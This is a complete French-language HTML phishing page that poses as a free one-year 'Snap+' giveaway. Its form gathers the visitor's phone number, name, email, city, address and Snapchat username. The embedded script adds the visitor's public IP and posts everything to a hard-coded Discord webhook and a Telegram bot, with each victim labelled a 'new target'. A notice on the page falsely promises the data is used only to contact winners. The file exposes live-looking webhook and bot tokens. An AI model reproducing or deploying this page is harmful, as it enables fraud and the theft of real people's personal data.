<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>🎁 Snap+ 1 An Gratuit</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1a0033, #2c014d);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: rgba(44, 1, 77, 0.85);
      border: 2px solid #a54ffb;
      border-radius: 20px;
      padding: 30px 25px;
      text-align: center;
      width: 340px;
      box-shadow: 0 0 20px #a54ffb;
      animation: pulseBorder 2s infinite;
    }
    @keyframes pulseBorder {
      0%, 100% { box-shadow: 0 0 10px #a54ffb; }
      50%      { box-shadow: 0 0 25px #a54ffb; }
    }
    .logo {
      font-size: 70px;
      margin-bottom: 5px;
      text-shadow: 0 0 10px #fff;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 15px;
      letter-spacing: 1px;
    }
    p {
      font-size: 15px;
      color: #ddd;
      margin-bottom: 25px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 2px solid #a54ffb;
      border-radius: 10px;
      background: transparent;
      color: white;
      font-size: 15px;
      outline: none;
      transition: border-color 0.3s;
    }
    input:focus {
      border-color: #c177ff;
    }
    input::placeholder {
      color: #ccc;
    }
    button {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      background: #a54ffb;
      border: none;
      border-radius: 10px;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 10px #a54ffb;
      transition: background-color 0.3s, box-shadow 0.3s;
    }
    button:hover {
      background: #8b3ddb;
      box-shadow: 0 0 20px #c177ff;
    }
    .notice {
      font-size: 12px;
      color: #bbb;
      margin-top: 15px;
    }
    #step2 {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">👻✨</div>
    <h1>Snap+ Gratuit</h1>
    <p>Active 1 an de Snap+ gratuitement</p>

    <form id="giveawayForm">
      <div id="step1">
        <input
          type="text"
          name="telephone"
          placeholder="Numéro de téléphone"
          required
          pattern="[\d\s+]{6,}"
          title="Entrez un numéro valide"
        />
        <button type="button" onclick="showStep2()">Continuer</button>
      </div>

      <div id="step2">
        <input type="text" name="nom" placeholder="Nom" required />
        <input type="text" name="prenom" placeholder="Prénom" required />
        <input type="email" name="email" placeholder="Email" required />
        <input type="text" name="ville" placeholder="Ville" required />
        <input type="text" name="departement" placeholder="Département" required />
        <input type="text" name="adresse" placeholder="Adresse (facultatif)" />
        <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
        <button type="submit">Valider</button>
      </div>
    </form>

    <div class="notice">
      Les données sont utilisées uniquement pour vous contacter si vous gagnez. Ce concours
      n’est pas affilié à Snapchat.
    </div>
  </div>

  <script>
    // Discord
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
    // Telegram
    const TELEGRAM_BOT_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
    const TELEGRAM_CHAT_ID   = "-1002810249796";

    const SUBMISSION_LIMIT = 2;
    const TIME_WINDOW_MINUTES = 30;

    function showStep2() {
      const tel = document.querySelector('[name="telephone"]').value.trim();
      if (!tel) {
        alert("Veuillez entrer votre numéro de téléphone.");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    }

    async function getPublicIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        return (await res.json()).ip || "IP inconnue";
      } catch {
        return "IP inconnue";
      }
    }

    function canSubmit() {
      const now = Date.now();
      const arr = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
      const recent = arr.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60e3);
      if (recent.length >= SUBMISSION_LIMIT) return false;
      recent.push(now);
      localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
      return true;
    }

    // échappement MarkdownV2 pour Telegram
    function escapeMdV2(t) {
      return t.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
    }

    async function sendToTelegram(msg) {
      const url  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const body = {
        chat_id: TELEGRAM_CHAT_ID,
        text: msg,
        parse_mode: "MarkdownV2",
        disable_web_page_preview: true
      };
      const res = await fetch(url, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify(body)
      });
      if (!res.ok) throw new Error("Telegram API error");
    }

    document.getElementById("giveawayForm").addEventListener("submit", async e => {
      e.preventDefault();
      if (!canSubmit()) {
        alert(`Limite de ${SUBMISSION_LIMIT} participations par ${TIME_WINDOW_MINUTES} min atteinte.`);
        return;
      }

      const data = new FormData(e.target);
      const ip   = await getPublicIP();

      // message cadre pour Discord
      const discordMsg = `
┌─🎁 Nouvelle cible Snap+ @everyone
│
│ ┌─📞 Contact
│ │ ├─ Téléphone   : ${data.get("telephone")||"N/A"}
│ │ ├─ Email       : ${data.get("email")    ||"N/A"}
│ │ └─ Snapchat    : ${data.get("snap")     ||"N/A"}
│
│ ├─👤 Identité
│ │ ├─ Nom        : ${data.get("nom")       ||"N/A"}
│ │ ├─ Prénom     : ${data.get("prenom")    ||"N/A"}
│
│ ├─📍 Localisation
│ │ ├─ Ville        : ${data.get("ville")      ||"N/A"}
│ │ ├─ Département  : ${data.get("departement")||"N/A"}
│ │ └─ Adresse      : ${data.get("adresse")    ||"Non fournie"}
│
│ └─🌐 Autres
│   └─ IP          : ${ip}
│
└─🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
`;

      // message cadre pour Telegram
      const telegramMsg = escapeMdV2(`
┌─🎁 *Nouvelle cible Snap+* @everyone
│
│ ┌─📞 Contact
│ │ ├─ Téléphone   : ${data.get("telephone")||"N/A"}
│ │ ├─ Email       : ${data.get("email")    ||"N/A"}
│ │ └─ Snapchat    : ${data.get("snap")     ||"N/A"}
│
│ ├─👤 Identité
│ │ ├─ Nom        : ${data.get("nom")       ||"N/A"}
│ │ ├─ Prénom     : ${data.get("prenom")    ||"N/A"}
│
│ ├─📍 Localisation
│ │ ├─ Ville        : ${data.get("ville")      ||"N/A"}
│ │ ├─ Département  : ${data.get("departement")||"N/A"}
│ │ └─ Adresse      : ${data.get("adresse")    ||"Non fournie"}
│
│ └─🌐 Autres
│   └─ IP          : ${ip}
│
└─🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
`);

      try {
        // Discord
        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: {"Content-Type":"application/json"},
          body: JSON.stringify({ content: discordMsg })
        });
        // Telegram
        await sendToTelegram(telegramMsg);
        // redirection
        window.location.href = "merci.html";
      } catch (err) {
        console.error(err);
        alert("Erreur lors de l’envoi. Réessayez.");
      }
    });
  </script>
</body>
</html>
